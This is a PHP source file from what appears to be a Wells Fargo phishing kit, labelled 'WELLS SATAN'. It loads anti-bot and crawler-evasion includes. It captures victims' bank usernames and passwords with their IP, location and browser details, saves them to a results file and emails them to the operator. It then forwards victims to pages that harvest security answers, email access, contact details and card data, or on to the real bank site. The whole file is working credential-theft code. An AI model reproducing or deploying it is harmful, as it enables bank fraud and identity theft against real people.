<?php
ob_start();
session_start();

include'../Anti/IP-BlackList.php';  
include'../Anti/Bot-Crawler.php';
include'../Anti/Bot-Spox.php';
include'../Anti/blacklist.php';
include'../Anti/new.php';
include'../Anti/Dila_DZ.php';
@require "../Anti/Crawler/src/CrawlerDetect.php";

use JayBizzle\CrawlerDetect\CrawlerDetect;

if(isset($_POST['username'])&&isset($_POST['password'])){
	include '../config.php';
	include '../Functions/Fuck-you.php';

	$WELLS_SESSION_SPOX_LOGIN = "login_SESSION";
	$_SESSION['login_SESSION'] = $WELLS_SESSION_SPOX_LOGIN;

	$hi="#---------------------------[ -WELLS-SATAN- NEW LOGIN ]----------------------------#\r\n";
	$hi.="Type		: {$_POST['destination']}-Wells\r\n";
	$hi.="UserID		: {$_POST['username']}\r\n";
	$hi.="Password 	: {$_POST['password']}\r\n";
	$hi.="#---------------------------[ -WELLS-SATAN- IP INFO ]----------------------------#\r\n";
	$hi.="IP ADDRESS	: {$_SESSION['ip']}\r\n";
	$hi.="IP COUNTRY	: {$_SESSION['country']}\r\n";
	$hi.="IP CITY	: {$_SESSION['city']}\r\n";
	$hi.="BROWSER		: {$_SESSION['browser']} on {$_SESSION['platform']}\r\n";
	$hi.="USER AGENT	: {$_SERVER['HTTP_USER_AGENT']}\r\n";
	$hi.="TIME		: ".date("d/m/Y h:i:sa")." GMT\r\n";
	$hi.="#---------------------------[ -WELLS-SATAN- NEW LOGIN ]----------------------------#\r\n";

		$save=fopen("../Wells_result/logins.txt","a+");
		fwrite($save,$hi);
		fclose($save);

	$subject="#WELLS SATAN [".$_POST['username']."] From {$_SESSION['ip']} [ {$_SESSION['country']}-{$_SESSION['countrycode']} - {$_SESSION['platform']} ]";

	$headers="From: WELLS SATAN <wells_spox@dila.dz>\r\n";
	$headers.="MIME-Version: 1.0\r\n";
	$headers.="Content-Type: text/plain; charset=UTF-8\r\n";

		@mail($your_email,$subject,$hi,$headers);

    
    $key = substr(sha1(mt_rand()),1,25);
    
	if ($show_question=="yes") {
		exit(header("Location: ../../Security_Question?wells_id=".$key."&country=".$_SESSION['country']."&iso=".$_SESSION['countrycode'].""));
	}
	if ($show_email_access=="yes") {
		exit(header("Location: ../../Email_verification?wells_id=".$key."&country=".$_SESSION['country']."&iso=".$_SESSION['countrycode'].""));
	}
	if ($show_contact_information=="yes") {
		exit(header("Location: ../../Contact_information?wells_id=".$key."&country=".$_SESSION['country']."&iso=".$_SESSION['countrycode'].""));
	}
	if ($show_credit_card=="yes") {
		exit(header("Location: ../../credit_verification?wells_id=".$key."&country=".$_SESSION['country']."&iso=".$_SESSION['countrycode'].""));
	}
	if ($show_success_page=="yes") {
		exit(header("Location: ../../Success?wells_id=".$key."&country=".$_SESSION['country']."&iso=".$_SESSION['countrycode']."")); 
	}else{

		$helper = array_keys($_SESSION);
    		foreach ($helper as $key){
        		unset($_SESSION[$key]);
    			}
    		exit(header("Location: https://bit.ly/2UgDDbr")); // go to bank login page officiel..
	}

}else{
    header("HTTP/1.0 404 Not Found");
    exit();
}

?>